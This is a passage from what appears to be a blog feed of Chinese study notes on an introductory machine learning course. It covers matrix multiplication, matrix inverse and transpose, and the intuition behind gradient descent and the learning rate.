然后告诉你这其中运算的细节</li><li>那么 我要做的第一件事是 我先把 右边这个矩阵的第一列 提取出来 然后我将会把 左边的这个矩阵和 之前取出来的这一列（前面提过的，向量）相乘 这只是第一列 是吧？ 然后我们可以看到 如果我 这么做 我就会得到向量（11,9） 所以这是与上个视频的矩阵 和向量的乘法是一样的 我已经提前算出了这个结果 是（11,9） 那么 之后的第二件事 我要做的就是 我将把第二列再单独提出出来 右边这个矩阵的第二列 然后我将要把它和 左边这个矩阵相乘 是的吧 所以 这就是那个矩阵 用右边的第二列 来乘以这个矩阵 因此 同样的 这是一个矩阵和 向量的乘法运算 这 就是你从上一个视频所学到的 如果你这么做 把这个矩阵和这个向量相乘 你会得到 （10,14）这个结果 顺便说一下 如果你想练习 矩阵和向量的乘法运算 那么就先暂停下视频 自己算一算结果对不对 好吧 现在我仅仅需要 将得到的这两个结果放在一起 那么这就是我的答案了 那么 我们可以看到 计算结果是 一个2 x 2的矩阵 我用来填充这个矩阵的方法 就是 把我的（11,9） 填在这里 把（10，14）填在 第二列 是的吧？ 所以 这就是如何 将两个矩阵相乘的 详细方法与过程 每次你只需要看 第二个矩阵的一列 然后把你的答案拼凑起来</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563661_226179955_1539954253" alt="_1526563661_226179955_1539954253_1526563661_226179955.png"></p><ul><li>再次强调下 我们将一步步的来计算 几秒中的时间里需要非常仔细 但我也要指出 我也要指出的是 第一个例子是一个2X3矩阵 乘以一个 3x2的矩阵 他们相乘 得到的结果 是一个2x2的 矩阵 我们将很快知道为什么是这个结果 好的 这是计算的技巧 让我们再看看 这其中的细节 看看究竟发生了什么</li><li>下面就是详细的过程 我有一个矩阵A 我要把它乘以 矩阵B 其结果 会是一个新的矩阵C 并且你会发现你只能 相乘那些维度 匹配的矩阵 因此如果A是一个<code>m×n</code>的矩阵 就是说m行n列 我将要用它与 一个<code>n×o</code>的矩阵相乘 并且实际上这里的n 必须匹配这里的这个n 所以<strong>第一个矩阵的列的数目 必须等于第二矩阵中的行的数目</strong> 并且相乘得到的结果 结果会是一个<code>m×o</code>的矩阵 就像这个矩阵C这样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563670_496687926_1539954288" alt="_1526563670_496687926_1539954288_1526563670_496687926.png"></p><ul><li>并且 在前面的视频中 我们所做的一切都符合这个规则 这是一种当矩阵B的o值 等于1的特殊情况（指的是矩阵和向量相乘） 明白了吗？ 这是在B是一个向量的情况下 但是现在 我们要处理 O的值大于1的情况</li><li>所以 这里就是你怎样 把两个矩阵相乘 为了得到结果 我要做的就是 我将要取 B矩阵的第一列 把取出的这列看成一个向量 并乘以矩阵A 用B矩阵的第一列 这个计算结果将是 m×1的矩阵（也就是一个向量） 我们把结果先放在这里</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563690_1096939048_1539954295" alt="_1526563690_1096939048_1539954295_1526563690_1096939048.png"></p><ul><li>然后 我将要取 B矩阵的 第二列 那么我会又得到一个n×1的向量 也就是 这里的这一列 这是正确的 n×1的矩阵 也就是n维的向量 我将要把这个矩阵 和这些n乘1的向量相乘 其结果将是 一个m维的向量 然后我会把结果先放在那里 依此类推 对吧？</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563701_1971649980_1539954309" alt="_1526563701_1971649980_1539954309_1526563701_1971649980.png"></p><ul><li>那么 你知道的 我开始取第三列 把它和这个矩阵相乘 我又得到了一个M维向量 依此类推 直到你计算到了 最后一列 矩阵乘以 你取到的最后一列 就是C的最后一列 再说一遍 矩阵C的第i列 是根据把 矩阵A与 矩阵B的第i列 相乘得到的 结果 依次相加 从1,2到o依次相加的 对吧？</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563712_1758839025_1539954330" alt="_1526563712_1758839025_1539954330_1526563712_1758839025.png"></p><ul><li>那么 我们在这里做一个总结 我们总结了我们为了 计算矩阵C所做的步骤 让我们再看一个例子 比方说我想把这两个矩阵相乘</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563727_676793122_1539954340" alt="_1526563727_676793122_1539954340_1526563727_676793122.png"></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563734_828514080_1539954344" alt="_1526563734_828514080_1539954344_1526563734_828514080.png"></p><h3 id="矩阵乘法笔记"><a href="#矩阵乘法笔记" class="headerlink" title="矩阵乘法笔记"></a>矩阵乘法笔记</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563746_251656436_1539954349" alt="_1526563746_251656436_1539954349_1526563746_251656436.png"></p><h2 id="Matrix-Multiplication-Properties"><a href="#Matrix-Multiplication-Properties" class="headerlink" title="Matrix Multiplication Properties"></a>Matrix Multiplication Properties</h2><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563766_2059918306_1539954356" alt="_1526563766_2059918306_1539954356_1526563766_2059918306.png"></p><h3 id="矩阵乘法的性质笔记"><a href="#矩阵乘法的性质笔记" class="headerlink" title="矩阵乘法的性质笔记"></a>矩阵乘法的性质笔记</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563800_776821059_1539954362" alt="_1526563800_776821059_1539954362_1526563800_776821059.png"></p><h2 id="Inverse-adn-Transpose"><a href="#Inverse-adn-Transpose" class="headerlink" title="Inverse adn Transpose"></a>Inverse adn Transpose</h2><ul><li>只有方阵才有<code>逆阵</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563816_1312285084_1539954375" alt="_1526563816_1312285084_1539954375_1526563816_1312285084.png"></p><ul><li>Octave求逆阵</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563829_456329215_1539954391" alt="_1526563829_456329215_1539954391_1526563829_456329215.png"></p><h3 id="矩阵的逆和转置笔记"><a href="#矩阵的逆和转置笔记" class="headerlink" title="矩阵的逆和转置笔记"></a>矩阵的逆和转置笔记</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563839_527465345_1539954398" alt="_1526563839_527465345_1539954398_1526563839_527465345.png"></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二章 单变量线性回归(Linear Regression with One Variable)</title>
      <link href="/2018/11/15/di-er-zhang-dan-bian-liang-xian-xing-hui-gui-linear-regression-with-one-variable/"/>
      <url>/2018/11/15/di-er-zhang-dan-bian-liang-xian-xing-hui-gui-linear-regression-with-one-variable/</url>
      
        <content type="html"><![CDATA[<h2 id="Gradient-Descennt"><a href="#Gradient-Descennt" class="headerlink" title="Gradient Descennt"></a>Gradient Descennt</h2><blockquote><p>我们已经定义了<code>代价函数J</code> 而在这段视频中 我想向你们介绍<code>梯度下降</code>这种算法 <strong>这种算法可以将代价函数$J$最小化</strong> 梯度下降是很常用的算法 它不仅被用在线性回归上 它实际上被广泛的应用于机器学习领域中的众多领域 在后面课程中 为了解决其他线性回归问题 我们也<strong>也将使用梯度下降法 最小化其他函数</strong> 而不仅仅是只用在本节课的代价函数$J$ 因此在这个视频中 我将讲解用梯度下降算法最小化函数 $J$在后面的视频中 我们还会将此算法应用于具体的 代价函数J中来解决线性回归问题 下面是问题概述</p></blockquote><ul><li>在这里 我们有一个函数 $J(\theta_0, \theta_1)$ 也许这是一个线性回归的代价函数 也许是一些其他函数 要使其最小化 我们需要用一个算法 来最小化函数$J(\theta_0, \theta_1)$ 就像刚才说的 事实证明 梯度下降算法可应用于 多种多样的函数求解 所以想象一下如果你有一个函数$J(\theta_0, \theta_1,…,\theta_n)$  你希望可以通过最小化 $\theta_0$到$\theta_n$来最小化此代价函数$J(\theta_0, \theta_1,…,\theta_n)$  用n个$\theta$是为了证明梯度下降算法可以解决更一般的问题 但为了简洁起见 为了简化符号 在接下来的视频中 我只用两个参数<a id="more"></a></li><li>下面就是关于梯度下降的构想 我们要做的是 我们<strong>要开始对$\theta_0$和$\theta_1$ 进行一些初步猜测(也就是初始化)</strong> 它们到底是什么其实并不重要 但<strong>通常的选择是将 $\theta_0$设为0 将$\theta_1$也设为0 将它们都初始化为0</strong> 我们在梯度下降算法中要做的 就是<strong>不停地一点点地改变 $\theta_0$和$\theta_1$ 试图通过这种改变使得$J(\theta_0, \theta_1)$变小 直到我们找到 $J$ 的最小值 或许是局部最小值</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560718_677839576_1539945526" alt="_1526560718_677839576_1539945526_1526560718_677839576.png"></p><ul><li>让我们通过一些图片来看看梯度下降法是如何工作的 我在试图让这个函数值最小 注意坐标轴 $\theta_0$和$\theta_1$在水平轴上 而函数 $J$在垂直坐标轴上 图形表面高度则是 $J$的值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560743_1565219096_1539945560" alt="_1526560743_1565219096_1539945560_1526560743_1565219096.png"></p><ul><li>我们希望最小化这个函数 所以我们从 $\theta_0$ 和 $\theta_1$ 的某个值出发 所以想象一下 <strong>对 $\theta_0$和$\theta_1$赋以某个初值 也就是对应于从这个函数表面上的某个起始点出发</strong> 对吧 所以<strong>不管 $\theta_0$和$\theta_1$的取值是多少 我将它们<code>初始化为0</code> 但有时你也可把它初始化为其他值</strong> 现在我希望大家把这个图像想象为一座山 想像类似这样的景色 公园中有两座山 想象一下你正站立在山的这一点上 站立在你想象的公园这座红色山上 在梯度下降算法中 我们<strong>要做的就是旋转360度 看看我们的周围 并问自己 我要在某个方向上 用小碎步尽快下山 这些小碎步需要朝什么方向?</strong></li><li>如果我们站在山坡上的这一点 你看一下周围 你会发现<strong>最佳的下山方向</strong> 大约是那个方向 好的 现在你在山上的新起点上</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560798_666068590_1539945598" alt="_1526560798_666068590_1539945598_1526560798_666068590.png"></p><ul><li>你再看看周围 然后再一次想想 我应该从什么方向迈着小碎步下山? 然后你按照自己的判断又迈出一步 往那个方向走了一步</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560828_2138414653_1539945611" alt="_1526560828_2138414653_1539945611_1526560828_2138414653.png"></p><ul><li><strong>然后重复上面的步骤</strong> 从这个新的点 你环顾四周 并<strong>决定从什么方向将会最快下山</strong> 然后又迈进了一小步 又是一小步 并依此类推 直到你接近这里 <strong>直到局部最低点的位置</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560836_1542066151_1539945624" alt="_1526560836_1542066151_1539945624_1526560836_1542066151.png"></p><ul><li>此外 这种下降有一个有趣的特点 第一次我们是从这个点开始进行梯度下降算法的 是吧 在这一点上从这里开始 现在想象一下 我们在刚才的右边一些的位置 对梯度下降进行初始化 想象我们在右边高一些的这个点 开始使用梯度下降 如果你重复上述步骤 停留在该点 并环顾四周 往下降最快的方向迈出一小步 然后环顾四周 又迈出一步 然后如此往复 如果你从右边不远处开始 梯度下降算法将会带你来到 这个右边的第二个局部最优处</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560853_1272028194_1539945641" alt="_1526560853_1272028194_1539945641_1526560853_1272028194.png"></p><ul><li>如果从刚才的第一个点出发 你会得到这个局部最优解 但如果你的起始点偏移了一些 起始点的位置略有不同 你<strong>会得到一个 非常不同的局部最优解 这就是梯度下降算法的一个特点</strong> 我们会在之后继续探讨这个问题</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560865_949036406_1539945662" alt="_1526560865_949036406_1539945662_1526560865_949036406.png"></p><ul><li>好的 这是我们从图中得到的直观感受 看看这个图 这是梯度下降算法的定义 我们<strong>将会反复做这些 直到收敛</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526560876_637224678_1539945680" alt="_1526560876_637224678_1539945680_1526560876_637224678.png"></p><ul><li>我们要<strong>更新参数 $\theta_j$ 方法是 用 $\theta_j$ 减去 $\alpha$乘以这一部分</strong><ul><li><code>:= 表示赋值</code> 这是一个赋值运算符</li><li><code>等号 =</code> :写出<code>a=b</code> 那么这是一个判断为真的<strong>声明</strong> 如果我<strong>写 a=b 就是在断言 a的值是等于 b的值的</strong> 这是声明 声明 a的值 与b的值相同</li><li><code>α</code> :一个数字 被称为<code>学习速率</code><ul><li>什么是$\alpha$呢? 在梯度下降算法中 它控制了 <strong>我们下山时会迈出多大的步子</strong> 因此如果 $\alpha$值很大 那么相应的梯度下降过程中 我们会试图用大步子下山 如果$\alpha$值很小 那么我们会迈着很小的小碎步下山 关于如何设置 $\alpha$的值等内容 在之后的课程中 我会回到这里并且详细说明 $\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)$</li></ul></li><li>最后 是公式的这一部分$\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)$ 这是一个<strong>微分项</strong> 我现在不想谈论它 但我会推导出这个微分项 并告诉你到底这要如何计算 你们中有人大概比较熟悉微积分 但即使你不熟悉微积分 也不用担心 我会告诉你 对这一项 你最后需要做什么</li></ul></li><li>现在 在梯度下降算法中 还有一个更微妙的问题 在梯度下降中 我们要更新 $\theta_0$ 和 $\theta_1$ 当 j=0 和 j=1 时 会产生更新 所以你将更新  $\theta_0$ 和 $\theta_1$ 实现梯度下降算法的微妙之处是 在这个表达式中 如果你要更新这个等式 你<strong>需要同时更新 $\theta_0$ 和 $\theta_1$</strong>  实现方法是 <strong>你应该计算公式右边的部分 通过那一部分计算出$\theta_0$ 和 $\theta_1$的值 然后同时更新 $\theta_0$ 和 $\theta_1$</strong> 让我进一步阐述这个过程</li><li>在梯度下降算法中 下图是正确实现同时更新的方法 我要设 temp0等于这些 设temp1等于那些 所以首先计算出公式右边这一部分 然后将计算出的结果 一起存入 temp0和 temp1 之中 然后同时更新 θ0和θ1 因为这才是正确的实现方法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561065_1055239768_1539945798" alt="_1526561065_1055239768_1539945798_1526561065_1055239768.png"></p><ul><li>与此相反 下面是不正确的实现方法 因为它没有做到<strong>同步更新</strong> 在这种不正确的实现方法中 我们计算 temp0 然后我们更新 $\theta_0$ 然后我们计算 temp1 然后我们将 temp1 赋给θ1 右边的方法和左边的区别是 让我们看这里 就是这一步 如果这个时候你已经更新了θ0 那么你会使用 θ0的新的值来计算这个微分项 所以由于你已经在这个公式中使用了新的 θ0的值 那么这会产生一个与左边不同的 temp1的值 所以右边并不是正确地实现梯度下降的做法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561083_1129145205_1539945818" alt="_1526561083_1129145205_1539945818_1526561083_1129145205.png"></p><ul><li>我不打算解释为什么你需要同时更新 <strong>同时更新是梯度下降中的一种常用方法</strong> 我们之后会讲到 <strong>实际上同步更新是更自然的实现方法</strong> 当<strong>人们谈到梯度下降时 他们的意思就是同步更新</strong> 如果用非同步更新去实现算法 代码可能也会正确工作 但是右边的方法并不是人们所指的那个梯度下降算法 而是具有不同性质的其他算法 由于各种原因 这其中会表现出微小的差别 你应该做的是 在梯度下降中真正实现同时更新 这些就是梯度下降算法的梗概</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561100_393689345_1539945882" alt="_1526561100_393689345_1539945882_1526561100_393689345.png"></p><ul><li>在接下来的视频中 我们要进入这个微分项的细节之中 我已经写了出来但没有真正定义 如果你已经修过微积分课程 如果你熟悉偏导数和导数 这其实就是这个微分项 如果你不熟悉微积分 不用担心 即使你之前没有看过微积分 或者没有接触过偏导数 在接下来的视频中 你会得到一切你需要知道的 如何计算这个微分项的知识 下一个视频中 希望我们能够给出 实现梯度下降算法的所有知识</li></ul><h3 id="小小的总结–Gradient-Descennt-梯度下降"><a href="#小小的总结–Gradient-Descennt-梯度下降" class="headerlink" title="小小的总结–Gradient Descennt(梯度下降)"></a>小小的总结–Gradient Descennt(梯度下降)</h3><ul><li><p>在<strong>假设函数</strong>中，我们需要估计<strong>假设函数</strong>中的<strong>参数</strong>。这就是梯度下降的地方。</p></li><li><p>x轴表示$\theta_0$，y轴表示$\theta_1$，z轴上表示$J(\theta_0,\theta_1)$代价函数。我们图上的点是 给定$\theta_0$和$\theta_1$ 代价函数的值。</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561137_131391682_1539945928" alt="_1526561137_131391682_1539945928_1526561137_131391682.png"></p><ul><li><p><strong>当我们的代价函数处于图的底部时，即当其值是局部最小时，表示我们已经找到正确的$\theta_0$和$\theta_1$。红色箭头显示图表中的最小点</strong>。</p></li><li><p>我们这样做的方式是<strong>通过获取代价函数的导数（函数的切线）</strong>。<strong>切线的斜率是该点的导数</strong>，它会给我们一个走向的方向。我们逐步降低成本函数的下降速度。每一步的大小由<code>参数α</code>决定，称为<strong>学习率</strong>。</p></li><li><p>例如，<strong>上图中每个“星号”之间的距离代表由我们的参数α确定的一个步骤。 α越小，步长越小，α越大，步长越大。步进的方向取决于$J(\theta_0,\theta_1)$ 的偏导数</strong>。根据图表的起始位置，可能会出现不同的点。上面的图片向我们展示了两个不同的起点，最终在两个不同的地方。</p></li><li><p>梯度下降算法是：<br>重复，直到收敛：<br>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561170_2045903942_1539945980" alt="_1526561170_2045903942_1539945980_1526561170_2045903942.png">j = 0,1代表特征索引号。</p></li><li><p>在每次迭代j中，应<strong>同时更新参数$\theta_1,\theta_2,…\theta_n$</strong>。在计算第j次迭代之前更新特定参数会导致错误的实现。</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561190_832177929_1539945992" alt="_1526561190_832177929_1539945992_1526561190_832177929.png"></p><h2 id="Gradient-Descent-Intuition"><a href="#Gradient-Descent-Intuition" class="headerlink" title="Gradient Descent Intuition"></a>Gradient Descent Intuition</h2><blockquote><p>在之前的视频中 我们给出了一个数学上关于梯度 下降的定义 本次视频我们更深入研究一下 更直观地感受一下这个 算法是做什么的 以及梯度下降算法的更新过程有什么意义 这是我们上次视频中看到的梯度下降算法 提醒一下 这个<code>参数 α</code> 术语称为<code>学习速率</code> <strong>它控制我们以多大的幅度更新这个参数θj</strong>. 第二部分是导数项 而我在这个视频中要做的就是 给你一个更直观的认识 这两部分有什么用 以及 为什么当把 这两部分放一起时 整个更新过程是有意义的</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561218_1102222000_1539946039" alt="_1526561218_1102222000_1539946039_1526561218_1102222000.png"></p><ul><li>为了更好地让你明白 我要做是用一个稍微简单的例子 比如我们想最小化的那个 函数只有一个参数的情形 所以 <code>假如我们有一个代价函数J 只有一个参数 θ1</code> 就像我们前几次视频中讲的 $\theta_1$是一个实数 对吧？那么我们可以画出一维的曲线 看起来很简单 让我们试着去理解 为什么梯度下降法 会在这个函数上起作用</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561252_904671270_1539946074" alt="_1526561252_904671270_1539946074_1526561252_904671270.png"></p><ul><li>所以 假如这是我的函数 关于$\theta_1$的函数$J(\theta_1)$是一个实数 对吧？ 现在我们已经对这个蓝色点上用于梯度下降法的$\theta_1$ 进行了初始化 想象一下在我的函数图像上 从那个点出发 那么梯度下降 要做的事情是<strong>不断更新 $\theta_1$ 等于$\theta_1$ 减$\alpha$ 倍的 $\frac{d}{d\theta_1}J(\theta_1)$ 这个项</strong> 对吧？哦 顺便插一句 你知道 这个微分项是吧？可能你想问为什么我改变了符号 之前用的是偏导数的符号 如果你不知道偏导数的符号 和$\frac{d}{d\theta}$之间的区别是什么 不用担心 从技术上讲 在数学中 我们称这是一个<code>偏导数</code> 这是一个导数 这取决于函数J的参数数量 但是这是一个 数学上的区别 就本课的目标而言 可以默认为 这些偏导数符号 和$\frac{d}{d\theta}$是完全一样的东西 不用担心 是否存在任何差异 我会尽量使用数学上的 精确的符号 但就我们的目的而言 这些符号是没有区别的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561410_371681908_1539946127" alt="_1526561410_371681908_1539946127_1526561410_371681908.png"></p><ul><li>好的 那么我们来看这个方程 我们要计算 这个导数 求导的目的 基本上可以说 <strong>取红色一点的切线</strong> 就是这样一条红色的直线 刚好与函数相切于这一点 让我们看看这条红色直线的斜率 其实这就是导数 也就是说 直线的斜率 也就是这条 刚好与函数曲线相切的这条直线 这条直线的斜率正好是 这个<strong>高度除以这个水平长度</strong> 现在 这条线有 一个正斜率 也就是说它有正导数 因此 我得到的新的$\theta_1$  <strong>$\theta_1$更新后等于$\theta_1$减去一个正数乘以$\alpha$</strong>. <strong>$\alpha$ 也就是学习速率也是一个正数</strong> 所以 我要使$\theta_1$减去一个东西 所以相当于我将$\theta_1$向左移 使$\theta_1$<strong>变小了</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561401_1069093686_1539946176" alt="_1526561401_1069093686_1539946176_1526561401_1069093686.png"></p><ul><li>我们可以看到 这么做是对的 因为实际上我<strong>往这个方向移动 确实让我更接近那边的最低点</strong> 所以 梯度下降到目前为止似乎 是在做正确的事</li><li>让我们来看看另一个例子 让我们用同样的函数$J$ 同样再画出函数$J(\theta_1)$的图像 而这次 我们把参数初始化到左边红色这点 所以$\theta_1$ 在这里 同样把这点对应到曲线上 现在 导数项$\frac{d}{d\theta_1}J(\theta_1)$ 在这点上计算时 看上去会是红色这条线的斜率 这个导数是这条线的斜率 但是这条线向下倾斜 所以这条线具有<strong>负斜率</strong> 对吧？ 或者说 这个函数有负导数 也就意味着在那一点上有负斜率 因此 这个导数项小于等于零 所以 当我<strong>更新$\theta$时, $\theta$被更新为$\theta$减去$\alpha$乘以一个负数 因此我是在用 $\theta_1$减去一个负数 这意味着我实际上是在增加$\theta_1$</strong> 对不对？因为这是减去一个负数 意味着给$\theta$加上一个数 这就意味着最后我实际上增加了$\theta$的值 因此 我们将 从这里开始 增加$\theta$ 似乎这也是我希望得到的 也就是 让我<strong>更接近最小值</strong>了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561445_1568980368_1539946208" alt="_1526561445_1568980368_1539946208_1526561445_1568980368.png"></p><ul><li>所以 我希望这样很直观地给你解释了 导数项的意义 让我们接下来再看一看学习速率$\alpha$ 我们来研究一下它有什么用 这就是我梯度下降法的 更新规则 就是这个等式 让我们来看看如果$\alpha$ 太小或 $\alpha$ 太大 会出现什么情况 这第一个例子 $\alpha$太小会发生什么呢 这是我的函数$J(\theta)$ 就从这里开始 <strong>如果$\alpha$太小了 那么我要做的是要去 用一个比较小的数乘以更新的值</strong> 所以最终 它就像一个小宝宝的步伐 这是一步 然后从这个新的起点开始 迈出另一步 但是由于$\alpha$ 太小 因此只能迈出另一个 小碎步 所以如果我的学习速率太小 结果就是 只能这样像小宝宝一样一点点地挪动 去努力接近最低点 这样就需要很多步才能到达最低点 所以<strong>如果$\alpha$ 太小的话 可能会很慢 因为它会一点点挪动 它会需要 很多步才能到达全局最低点</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561464_253805835_1539946231" alt="_1526561464_253805835_1539946231_1526561464_253805835.png"></p><ul><li>那么如果$\alpha$ 太大又会怎样呢 这是我的函数$J(\theta)$ 如果$\alpha$ 太大 那么梯度下降法可能会越过最低点 甚至可能无法收敛 我的意思是 比如我们从这个点开始 实际上这个点已经接近最低点 因此导数指向右侧 但如果$\alpha$ 太大的话 我会迈出很大一步 也许像这样巨大的一步 对吧？所以我最终迈出了一大步 现在 我的代价函数变得更糟 因为离这个最低点越来越远 现在我的导数指向左侧 实际上在减小$\theta$ 但是你看 如果我的学习速率过大 我会移动一大步 从这点一下子又到那点了 对吗？如果我的学习率太大 下一次迭代 又移动了一大步 越过一次 又越过一次 一次次越过最低点 直到你发现 实际上 离最低点越来越远 所以 <strong>如果$\alpha$太大 它会导致无法收敛 甚至发散</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561479_1021372496_1539946255" alt="_1526561479_1021372496_1539946255_1526561479_1021372496.png"></p><ul><li>现在 我还有一个问题 这问题挺狡猾的  如果我们<strong>预先把$\theta_1$ 放在一个局部的最低点</strong> 你认为下一步梯度下降法会怎样工作？ 所以假设你将$\theta_1$初始化在局部最低点 假设这是你的$\theta_1$的初始值 在这儿 它已经在一个局部的 最优处或局部最低点 结果是<strong>局部最优点的导数 将等于零</strong> 因为它是那条切线的斜率 而这条线的斜率将等于零 因此 此导数项等于0 因此 在你的梯度下降更新过程中 你有一个$\theta_1$ 然后用$\theta_1$ 减$\alpha$ 乘以0来更新$\theta_1$ 所以这意味着什么 这意味着你已经在局部最优点 它使得$\theta_1$不再改变 也就是<strong>新的$\theta_1$等于原来的$\theta_1$ 因此 如果你的参数已经处于 局部最低点 那么梯度下降法更新其实什么都没做 它不会改变参数的值</strong> 这也正是你想要的 因为它使你的解始终保持在 局部最优点 这也解释了为什么即使学习速率$\alpha$  保持不变时 梯度下降也可以收敛到局部最低点 我想说的是这个意思</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561493_322597671_1539946286" alt="_1526561493_322597671_1539946286_1526561493_322597671.png"></p><ul><li>我们来看一个例子 这是代价函数$J(\theta)$ 我想找到它的最小值 首先初始化我的梯度下降算法 在那个品红色的点初始化 如果我更新一步梯度下降 也许它会带我到绿色这个点 因为这个点的导数是相当陡的 现在 在这个绿色的点 如果我再更新一步 你会发现我的导数 也即斜率 相比于在品红点 是没那么陡的  对吧？因为随着我接近最低点 我的导数越来越接近零 所以 <strong>梯度下降一步后 新的导数会变小一点点</strong> 然后我想再梯度下降一步 在这个绿点我自然会用一个稍微 跟刚才在那个品红点时比 再小一点的一步  现在到了新的点 红色点 更接近全局最低点了 因此这点的导数会比在绿点时更小 所以  我再进行一步梯度下降时 我的导数项是更小的 $\theta_1$更新的幅度就会更小 所以你会移动更小的一步 像这样 <strong>随着梯度下降法的运行  你移动的幅度会自动变得越来越小 直到最终移动幅度非常小 你会发现 已经收敛到局部极小值</strong> 所以回顾一下 <strong>在梯度下降法中 当我们接近局部最低点时 梯度下降法会自动采取 更小的幅度</strong> 这是因为当我们接近局部最低点时 很显然在<strong>局部最低时导数等于零</strong> 所以当我们 接近局部最低时 导数值会自动变得越来越小 所以梯度下降将自动采取较小的幅度 这就是梯度下降的做法 所以<strong>实际上没有必要再另外减小$\alpha$ 这就是梯度下降算法</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561559_975182746_1539946335" alt="_1526561559_975182746_1539946335_1526561559_975182746.png"></p><ul><li>你可以用它来最小化 最小化任何代价函数$J$ 不只是线性回归中的代价函数$J$ 在接下来的视频中 我们要用代价函数$J$ 回到它的本质 线性回归中的代价函数 也就是我们前面得出的平方误差函数 结合梯度下降法 以及平方代价函数 我们会得出第一个机器学习算法 即线性回归算法</li></ul><h3 id="小小的总结–Gradient-Descent-Intuition"><a href="#小小的总结–Gradient-Descent-Intuition" class="headerlink" title="小小的总结–Gradient Descent Intuition"></a>小小的总结–Gradient Descent Intuition</h3><ul><li>在本视频中，我们探索了使用一个参数$\theta_1$并绘制其代价函数来实现梯度下降的场景。 我们的单一参数公式为：</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561584_1088750870_1539946381" alt="_1526561584_1088750870_1539946381_1526561584_1088750870.png"></p><ul><li>无论 $\frac{d}{d\theta_1}J(\theta_1)$ 的斜率符号如何，$\theta_1$最终收敛到其最小值。 下图显示<strong>当斜率为负值时，$\theta_1$的值增加，当为正值时，$\theta_1$的值减小</strong>。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561620_33298999_1539946410" alt="_1526561620_33298999_1539946410_1526561620_33298999.png"></p><ul><li>在附注中，我们应该调整<code>参数α</code>以确保梯度下降算法在合理的时间内收敛。 未能收敛或获得最小值的时间太多意味着我们的步长是错误的。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561636_1697292728_1539946422" alt="_1526561636_1697292728_1539946422_1526561636_1697292728.png"></p><ul><li>梯度下降如何以固定步长$\alpha$收敛？<br>收敛背后的直觉是，当我们逼近我们的凸函数的底部时，$\frac{d}{d\theta_1}J(\theta_1)$接近0。 因此我们得到：</li></ul><p>$\theta_1:=\theta_1-\alpha*0$</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526561675_2093920258_1539946481" alt="_1526561675_2093920258_1539946481_1526561675_2093920258.png"></p><h2 id="Gradient-Descent-For-Linear-Regression"><a href="#Gradient-Descent-For-Linear-Regression" class="headerlink" title="Gradient Descent For Linear Regression"></a>Gradient Descent For Linear Regression</h2><blockquote><p>在以前的视频中我们谈到 关于梯度下降算法 梯度下降是很常用的算法 它不仅被用在线性回归上 和线性回归模型、平方误差代价函数 在这段视频中 我们要 <strong>将<code>梯度下降</code> 和<code>代价函数</code>结合</strong> 在后面的视频中 我们将用到此算法 并将其应用于 具体的拟合直线的线性回归算法里 这就是 我们在之前的课程里所做的工作</p></blockquote><ul><li>这是<strong>梯度下降算法</strong> 这个算法你应该很熟悉 这是<strong>线性回归模型</strong> 还有<strong>线性假设</strong>和<strong>平方误差代价函数</strong> 我们将要做的就是 <strong>用梯度下降的方法 来最小化平方误差代价函数</strong> 为了 使梯度下降 为了 